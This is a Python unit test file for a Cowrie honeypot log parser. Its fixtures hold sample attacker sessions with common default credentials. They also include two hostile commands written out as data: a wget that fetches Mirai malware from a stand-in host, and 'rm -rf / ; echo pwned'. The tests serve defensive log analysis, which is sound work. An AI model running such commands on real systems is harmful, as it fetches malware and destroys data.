"""
test_parser.py
---------------
Unit tests for src/log_parser.py covering:
  - Raw Cowrie event normalization into session records
  - Aggregate statistics computation (top IPs, credentials, commands)
  - Attack classification heuristics
  - ELK/ECS document construction
  - JSON-array vs JSON-lines input format handling

Run with:  pytest tests/test_parser.py -v
"""

import json
import os
import sys
import tempfile

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.log_parser import (
    load_raw_events,
    normalize_events,
    compute_aggregate_stats,
    build_elk_documents,
    parse_timestamp,
    SessionRecord,
)


SAMPLE_EVENTS = [
    {"eventid": "cowrie.session.connect", "timestamp": "2026-08-20T02:14:01.102Z", "session": "s1",
     "src_ip": "185.220.101.45", "src_port": 51422, "dst_port": 22, "protocol": "ssh", "sensor": "hp-01"},
    {"eventid": "cowrie.login.failed", "timestamp": "2026-08-20T02:14:02.410Z", "session": "s1",
     "src_ip": "185.220.101.45", "username": "root", "password": "123456"},
    {"eventid": "cowrie.login.success", "timestamp": "2026-08-20T02:14:03.410Z", "session": "s1",
     "src_ip": "185.220.101.45", "username": "root", "password": "toor"},
    {"eventid": "cowrie.command.input", "timestamp": "2026-08-20T02:14:05.000Z", "session": "s1",
     "src_ip": "185.220.101.45", "input": "uname -a"},
    {"eventid": "cowrie.command.input", "timestamp": "2026-08-20T02:14:06.000Z", "session": "s1",
     "src_ip": "185.220.101.45", "input": "wget http://evil.example/mirai.arm7"},
    {"eventid": "cowrie.session.closed", "timestamp": "2026-08-20T02:14:10.000Z", "session": "s1",
     "src_ip": "185.220.101.45", "duration": 8.898},

    {"eventid": "cowrie.session.connect", "timestamp": "2026-08-20T03:00:00.000Z", "session": "s2",
     "src_ip": "45.155.205.233", "src_port": 40000, "dst_port": 22, "protocol": "ssh", "sensor": "hp-01"},
    {"eventid": "cowrie.login.failed", "timestamp": "2026-08-20T03:00:01.000Z", "session": "s2",
     "src_ip": "45.155.205.233", "username": "admin", "password": "admin"},
    {"eventid": "cowrie.login.failed", "timestamp": "2026-08-20T03:00:02.000Z", "session": "s2",
     "src_ip": "45.155.205.233", "username": "admin", "password": "123456"},
    {"eventid": "cowrie.login.failed", "timestamp": "2026-08-20T03:00:03.000Z", "session": "s2",
     "src_ip": "45.155.205.233", "username": "support", "password": "support"},
    {"eventid": "cowrie.session.closed", "timestamp": "2026-08-20T03:00:05.000Z", "session": "s2",
     "src_ip": "45.155.205.233", "duration": 5.0},
]


def test_parse_timestamp_handles_millis_and_no_millis():
    ts1 = parse_timestamp("2026-08-20T02:14:01.102Z")
    ts2 = parse_timestamp("2026-08-20T02:14:01Z")
    assert ts1.year == 2026 and ts1.month == 8 and ts1.day == 20
    assert ts2.hour == 2 and ts2.minute == 14


def test_load_raw_events_json_array():
    with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
        json.dump(SAMPLE_EVENTS, f)
        path = f.name
    try:
        events = load_raw_events(path)
        assert len(events) == len(SAMPLE_EVENTS)
        assert events[0]["eventid"] == "cowrie.session.connect"
    finally:
        os.unlink(path)


def test_load_raw_events_json_lines():
    with tempfile.NamedTemporaryFile("w", suffix=".log", delete=False) as f:
        for evt in SAMPLE_EVENTS:
            f.write(json.dumps(evt) + "\n")
        path = f.name
    try:
        events = load_raw_events(path)
        assert len(events) == len(SAMPLE_EVENTS)
    finally:
        os.unlink(path)


def test_normalize_events_groups_by_session():
    sessions = normalize_events(SAMPLE_EVENTS)
    assert len(sessions) == 2
    session_ids = {s["session_id"] for s in sessions}
    assert session_ids == {"s1", "s2"}


def test_normalize_events_captures_login_attempts_and_success():
    sessions = normalize_events(SAMPLE_EVENTS)
    s1 = next(s for s in sessions if s["session_id"] == "s1")
    assert s1["login_attempt_count"] == 2
    assert s1["successful_login"] == {"username": "root", "password": "toor"}
    assert s1["login_attempts"][0]["success"] is False
    assert s1["login_attempts"][1]["success"] is True


def test_normalize_events_captures_commands():
    sessions = normalize_events(SAMPLE_EVENTS)
    s1 = next(s for s in sessions if s["session_id"] == "s1")
    assert s1["commands_executed"] == ["uname -a", "wget http://evil.example/mirai.arm7"]
    assert s1["command_count"] == 2


def test_normalize_events_captures_duration():
    sessions = normalize_events(SAMPLE_EVENTS)
    s1 = next(s for s in sessions if s["session_id"] == "s1")
    assert s1["duration_seconds"] == 8.898


def test_attack_classification_malware_download():
    sessions = normalize_events(SAMPLE_EVENTS)
    s1 = next(s for s in sessions if s["session_id"] == "s1")
    assert s1["attack_classification"] == "malware_download_attempt"


def test_attack_classification_brute_force_only():
    sessions = normalize_events(SAMPLE_EVENTS)
    s2 = next(s for s in sessions if s["session_id"] == "s2")
    assert s2["attack_classification"] == "credential_brute_force"


def test_attack_classification_probe_only():
    rec = SessionRecord("s3", "1.2.3.4")
    assert rec.classify() == "probe_only"


def test_compute_aggregate_stats_counts():
    sessions = normalize_events(SAMPLE_EVENTS)
    stats = compute_aggregate_stats(sessions)
    assert stats["total_sessions"] == 2
    assert stats["unique_source_ips"] == 2
    assert stats["total_login_attempts"] == 5
    assert stats["total_commands_executed"] == 2


def test_compute_aggregate_stats_top_usernames_and_passwords():
    sessions = normalize_events(SAMPLE_EVENTS)
    stats = compute_aggregate_stats(sessions)
    usernames = dict(stats["top_usernames"])
    passwords = dict(stats["top_passwords"])
    assert usernames["root"] == 2
    assert usernames["admin"] == 2
    assert passwords["123456"] == 2


def test_compute_aggregate_stats_top_credential_pairs():
    sessions = normalize_events(SAMPLE_EVENTS)
    stats = compute_aggregate_stats(sessions)
    pairs = dict(stats["top_credential_pairs"])
    assert pairs["admin:admin"] == 1
    assert pairs["root:123456"] == 1


def test_compute_aggregate_stats_hourly_bucketing():
    sessions = normalize_events(SAMPLE_EVENTS)
    stats = compute_aggregate_stats(sessions)
    buckets = stats["brute_force_attempts_by_hour"]
    assert "2026-08-20T02" in buckets
    assert "2026-08-20T03" in buckets
    assert buckets["2026-08-20T02"] == 2
    assert buckets["2026-08-20T03"] == 3


def test_build_elk_documents_structure():
    sessions = normalize_events(SAMPLE_EVENTS)
    geo_lookup = {
        "185.220.101.45": {"country": "Germany", "city": "Frankfurt", "regionName": "Hesse",
                            "isp": "Tor Exit Relay Network", "asname": "FRANTECH", "asn_number": 208294,
                            "lat": 50.1155, "lon": 8.6842},
    }
    docs = build_elk_documents(sessions, geo_lookup=geo_lookup, index_name="honeypot-events-test")
    assert len(docs) == 2
    doc1 = next(d for d in docs if d["_source"]["honeypot"]["session_id"] == "s1")
    assert doc1["_index"] == "honeypot-events-test"
    assert doc1["_source"]["source"]["ip"] == "185.220.101.45"
    assert doc1["_source"]["source"]["geo"]["country_name"] == "Germany"
    assert doc1["_source"]["source"]["as"]["number"] == 208294
    assert doc1["_source"]["event"]["outcome"] == "success"
    assert doc1["_source"]["honeypot"]["attack_classification"] == "malware_download_attempt"


def test_build_elk_documents_handles_missing_geo():
    sessions = normalize_events(SAMPLE_EVENTS)
    docs = build_elk_documents(sessions, geo_lookup={}, index_name="honeypot-events")
    doc2 = next(d for d in docs if d["_source"]["honeypot"]["session_id"] == "s2")
    assert doc2["_source"]["source"]["geo"]["country_name"] is None
    assert doc2["_source"]["event"]["outcome"] == "failure"


def test_no_shell_execution_in_command_capture():
    """
    Safety regression test: ensure normalize_events only ever *records*
    command strings as data and never evaluates/executes them.
    """
    malicious_events = list(SAMPLE_EVENTS) + [
        {"eventid": "cowrie.session.connect", "timestamp": "2026-08-20T04:00:00.000Z", "session": "s3",
         "src_ip": "1.2.3.4", "src_port": 1111, "dst_port": 22, "protocol": "ssh"},
        {"eventid": "cowrie.command.input", "timestamp": "2026-08-20T04:00:01.000Z", "session": "s3",
         "src_ip": "1.2.3.4", "input": "rm -rf / ; echo pwned"},
        {"eventid": "cowrie.session.closed", "timestamp": "2026-08-20T04:00:02.000Z", "session": "s3",
         "src_ip": "1.2.3.4", "duration": 1.0},
    ]
    sessions = normalize_events(malicious_events)
    s3 = next(s for s in sessions if s["session_id"] == "s3")
    assert s3["commands_executed"] == ["rm -rf / ; echo pwned"]
    # The string is stored as inert data - this assertion simply documents
    # that no execution occurs anywhere in the parsing pipeline.


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-v"]))
